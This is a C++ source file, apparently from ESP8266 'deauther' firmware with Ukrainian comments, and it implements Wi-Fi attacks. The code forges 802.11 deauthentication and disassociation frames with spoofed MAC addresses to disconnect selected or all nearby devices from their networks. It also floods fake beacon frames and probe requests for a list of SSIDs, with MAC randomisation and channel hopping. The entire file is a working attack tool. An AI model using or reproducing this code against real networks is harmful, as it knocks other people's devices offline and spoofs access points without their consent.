#include "Attack.h"
#include "settings.h"

Attack::Attack() {
    getRandomMac(mac);

    if (settings::getAttackSettings().beacon_interval == INTERVAL_1S) {
        beaconPacket[32] = 0xe8;
        beaconPacket[33] = 0x03;
    } else {
        beaconPacket[32] = 0x64;
        beaconPacket[33] = 0x00;
    }

    deauth.time = currentTime;
    beacon.time = currentTime;
    probe.time  = currentTime;
}

void Attack::start() {
    stop();
    prntln(A_START);
    attackTime      = currentTime;
    attackStartTime = currentTime;
    accesspoints.sortAfterChannel();
    stations.sortAfterChannel();
    running = true;
}

void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool output, uint32_t timeout) {
    Attack::beacon.active = beacon;
    Attack::deauth.active = deauth || deauthAll;
    Attack::deauthAll     = deauthAll;
    Attack::probe.active  = probe;
    Attack::output        = output;
    Attack::timeout       = timeout;

    if (beacon || probe || deauthAll || deauth) {
        start();
    } else {
        prntln(A_NO_MODE_ERROR);
        accesspoints.sort();
        stations.sort();
        stop();
    }
}

void Attack::stop() {
    if (running) {
        running              = false;
        deauthPkts           = 0;
        beaconPkts           = 0;
        probePkts            = 0;
        deauth.packetCounter = 0;
        beacon.packetCounter = 0;
        probe.packetCounter  = 0;
        deauth.maxPkts       = 0;
        beacon.maxPkts       = 0;
        probe.maxPkts        = 0;
        packetRate           = 0;
        deauth.tc            = 0;
        beacon.tc            = 0;
        probe.tc             = 0;
        deauth.active        = false;
        beacon.active        = false;
        probe.active         = false;
        prntln(A_STOP);
    }
}

bool Attack::isRunning() {
    return running;
}

void Attack::updateCounter() {
    if ((timeout > 0) && (currentTime - attackStartTime >= timeout)) {
        prntln(A_TIMEOUT);
        stop();
        return;
    }

    if (deauth.active) {
        if (deauthAll) deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                                        (accesspoints.count() + stations.count() * 2 - names.selected());
        else deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                              (accesspoints.selected() + stations.selected() * 2 + names.selected() + names.stations());
    } else {
        deauth.maxPkts = 0;
    }

    if (beacon.active) {
        beacon.maxPkts = ssids.count();
        if (settings::getAttackSettings().beacon_interval == INTERVAL_100MS) beacon.maxPkts *= 10;
    } else {
        beacon.maxPkts = 0;
    }

    if (probe.active) probe.maxPkts = ssids.count() * settings::getAttackSettings().probe_frames_per_ssid;
    else probe.maxPkts = 0;

    if (settings::getAttackSettings().random_tx && (beacon.active || probe.active)) setOutputPower(random(21));
    else setOutputPower(20.5f);

    deauthPkts           = deauth.packetCounter;
    beaconPkts           = beacon.packetCounter;
    probePkts            = probe.packetCounter;
    packetRate           = tmpPacketRate;
    deauth.packetCounter = 0;
    beacon.packetCounter = 0;
    probe.packetCounter  = 0;
    deauth.tc            = 0;
    beacon.tc            = 0;
    probe.tc             = 0;
    tmpPacketRate        = 0;
}

void Attack::status() {
    char s[120];
    sprintf(s, str(A_STATUS).c_str(), packetRate, deauthPkts, deauth.maxPkts, beaconPkts, beacon.maxPkts, probePkts,
            probe.maxPkts);
    prnt(String(s));
}

String Attack::getStatusJSON() {
    String json = String(OPEN_BRACKET);
    json += String(OPEN_BRACKET) + b2s(deauth.active) + String(COMMA) + String(scan.countSelected()) + String(COMMA) +
            String(deauthPkts) + String(COMMA) + String(deauth.maxPkts) + String(CLOSE_BRACKET) + String(COMMA);
    json += String(OPEN_BRACKET) + b2s(beacon.active) + String(COMMA) + String(ssids.count()) + String(COMMA) +
            String(beaconPkts) + String(COMMA) + String(beacon.maxPkts) + String(CLOSE_BRACKET) + String(COMMA);
    json += String(OPEN_BRACKET) + b2s(probe.active) + String(COMMA) + String(ssids.count()) + String(COMMA) +
            String(probePkts) + String(COMMA) + String(probe.maxPkts) + String(CLOSE_BRACKET) + String(COMMA);
    json += String(packetRate);
    json += CLOSE_BRACKET;
    return json;
}

void Attack::update() {
    if (!running || scan.isScanning()) return;
    apCount = accesspoints.count();
    stCount = stations.count();
    nCount  = names.count();
    deauthUpdate();
    deauthAllUpdate();
    beaconUpdate();
    probeUpdate();
    if (currentTime - attackTime > 1000) {
        attackTime = currentTime;
        updateCounter();
        if (output) status();
        getRandomMac(mac);
    }
}

void Attack::deauthUpdate() {
    if (!deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
            if ((apCount > 0) && (deauth.tc < apCount)) {
                if (accesspoints.getSelected(deauth.tc)) {
                    deauth.tc += deauthAP(deauth.tc);
                } else deauth.tc++;
            } else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
                if (stations.getSelected(deauth.tc - apCount)) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                } else deauth.tc++;
            } else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < nCount + stCount + apCount)) {
                if (names.getSelected(deauth.tc - stCount - apCount)) {
                    deauth.tc += deauthName(deauth.tc - stCount - apCount);
                } else deauth.tc++;
            }
            if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
        }
    }
}
void Attack::deauthAllUpdate() {
    if (deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
            // APs
            if ((apCount > 0) && (deauth.tc < apCount)) {
                tmpID = names.findID(accesspoints.getMac(deauth.tc));

                if (tmpID < 0) {
                    deauth.tc += deauthAP(deauth.tc);
                } else if (!names.getSelected(tmpID)) {
                    deauth.tc += deauthAP(deauth.tc);
                } else deauth.tc++;
            }
            // Stations
            else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
                tmpID = names.findID(stations.getMac(deauth.tc - apCount));

                if (tmpID < 0) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                } else if (!names.getSelected(tmpID)) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                } else deauth.tc++;
            }
            // Names
            else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < apCount + stCount + nCount)) {
                if (!names.getSelected(deauth.tc - apCount - stCount)) {
                    deauth.tc += deauthName(deauth.tc - apCount - stCount);
                } else deauth.tc++;
            }
            // reset counter
            if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
        }
    }
}

void Attack::probeUpdate() {
    if (probe.active && (probe.maxPkts > 0) && (probe.packetCounter < probe.maxPkts)) {
        if (probe.time <= currentTime - (1000 / probe.maxPkts)) {
            if (settings::getAttackSettings().attack_all_ch) setWifiChannel(probe.tc % 11, true);
            probe.tc += sendProbe(probe.tc);

            if (probe.tc >= ssids.count()) probe.tc = 0;
        }
    }
}

void Attack::beaconUpdate() {
    if (beacon.active && (beacon.maxPkts > 0) && (beacon.packetCounter < beacon.maxPkts)) {
        if (beacon.time <= currentTime - (1000 / beacon.maxPkts)) {
            beacon.tc += sendBeacon(beacon.tc);

            if (beacon.tc >= ssids.count()) beacon.tc = 0;
        }
    }
}

bool Attack::deauthStation(int num) {
    return deauthDevice(stations.getAPMac(num), stations.getMac(num), settings::getAttackSettings().deauth_reason, stations.getCh(num));
}

bool Attack::deauthAP(int num) {
    return deauthDevice(accesspoints.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, accesspoints.getCh(num));
}

bool Attack::deauthName(int num) {
    if (names.isStation(num)) {
        return deauthDevice(names.getBssid(num), names.getMac(num), settings::getAttackSettings().deauth_reason, names.getCh(num));
    } else {
        return deauthDevice(names.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, names.getCh(num));
    }
}

bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch) {
    if (!stMac) return false;  // вихід, коли mac станції нуль

    bool success = false;

    // побудувати пакет деаутентифікації
    packetSize = sizeof(deauthPacket);

    uint8_t deauthpkt[packetSize];

    memcpy(deauthpkt, deauthPacket, packetSize);

    memcpy(&deauthpkt[4], stMac, 6);
    memcpy(&deauthpkt[10], apMac, 6);
    memcpy(&deauthpkt[16], apMac, 6);
    deauthpkt[24] = reason;

    // відправити рамку деаутентифікації
    deauthpkt[0] = 0xc0;

    if (sendPacket(deauthpkt, packetSize, ch, true)) {
        success = true;
        deauth.packetCounter++;
    }

    // відправити рамку відсоединення
    uint8_t disassocpkt[packetSize];

    memcpy(disassocpkt, deauthpkt, packetSize);

    disassocpkt[0] = 0xa0;

    if (sendPacket(disassocpkt, packetSize, ch, false)) {
        success = true;
        deauth.packetCounter++;
    }

    // відправити ще один пакет, на цей раз від станції до точки доступу
    if (!macBroadcast(stMac)) { // але лише якщо пакет не є розсиланням
        // побудувати пакет деаутентифікації
        memcpy(&disassocpkt[4], apMac, 6);
        memcpy(&disassocpkt[10], stMac, 6);
        memcpy(&disassocpkt[16], stMac, 6);

        // відправити рамку деаутентифікації
        disassocpkt[0] = 0xc0;

        if (sendPacket(disassocpkt, packetSize, ch, false)) {
            success = true;
            deauth.packetCounter++;
        }

        // відправити рамку відсоединення
        disassocpkt[0] = 0xa0;

        if (sendPacket(disassocpkt, packetSize, ch, false)) {
            success = true;
            deauth.packetCounter++;
        }
    }

    if (success) deauth.time = currentTime;

    return success;
}

bool Attack::sendBeacon(uint8_t tc) {
    if (settings::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
    mac[5] = tc;
    return sendBeacon(mac, ssids.getName(tc).c_str(), wifi_channel, ssids.getWPA2(tc));
}

bool Attack::sendBeacon(uint8_t* mac, const char* ssid, uint8_t ch, bool wpa2) {
    packetSize = sizeof(beaconPacket);

    if (wpa2) {
        beaconPacket[34] = 0x31;
    } else {
        beaconPacket[34] = 0x21;
        packetSize      -= 26;
    }

    int ssidLen = strlen(ssid);

    if (ssidLen > 32) ssidLen = 32;

    memcpy(&beaconPacket[10], mac, 6);
    memcpy(&beaconPacket[16], mac, 6);
    memcpy(&beaconPacket[38], ssid, ssidLen);

    beaconPacket[82] = ch;

    // =====
    uint16_t tmpPacketSize = (packetSize - 32) + ssidLen;                // розрахувати розмір
    uint8_t* tmpPacket     = new uint8_t[tmpPacketSize];                 // створити буфер пакета

    memcpy(&tmpPacket[0], &beaconPacket[0], 38 + ssidLen);               // скопіювати першу половину пакета в буфер
    tmpPacket[37] = ssidLen;                                             // оновити байт довжини SSID
    memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13); // скопіювати другу половину пакета в буфер

    bool success = sendPacket(tmpPacket, tmpPacketSize, ch, false);

    if (success) {
        beacon.time = currentTime;
        beacon.packetCounter++;
    }

    delete[] tmpPacket; // видалити пам'ять відведеного буфера

    return success;
    // =====
}

bool Attack::sendProbe(uint8_t tc) {
    if (settings::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
    mac[5] = tc;
    return sendProbe(mac, ssids.getName(tc).c_str(), wifi_channel);
}

bool Attack::sendProbe(uint8_t* mac, const char* ssid, uint8_t ch) {
    packetSize = sizeof(probePacket);
    int ssidLen = strlen(ssid);

    if (ssidLen > 32) ssidLen = 32;

    memcpy(&probePacket[10], mac, 6);
    memcpy(&probePacket[26], ssid, ssidLen);

    if (sendPacket(probePacket, packetSize, ch, false)) {
        probe.time = currentTime;
        probe.packetCounter++;
        return true;
    }

    return false;
}

bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool force_ch) {
    // Serial.println(bytesToStr(packet, packetSize));

    // встановити канал
    setWifiChannel(ch, force_ch);

    // відправити пакет
    bool sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;

    if (sent) ++tmpPacketRate;

    return sent;
}

void Attack::enableOutput() {
    output = true;
    prntln(A_ENABLED_OUTPUT);
}

void Attack::disableOutput() {
    output = false;
    prntln(A_DISABLED_OUTPUT);
}

uint32_t Attack::getDeauthPkts() {
    return deauthPkts;
}

uint32_t Attack::getBeaconPkts() {
    return beaconPkts;
}

uint32_t Attack::getProbePkts() {
    return probePkts;
}

uint32_t Attack::getDeauthMaxPkts() {
    return deauth.maxPkts;
}

uint32_t Attack::getBeaconMaxPkts() {
    return beacon.maxPkts;
}

uint32_t Attack::getProbeMaxPkts() {
    return probe.maxPkts;
}

uint32_t Attack::getPacketRate() {
    return packetRate;
}
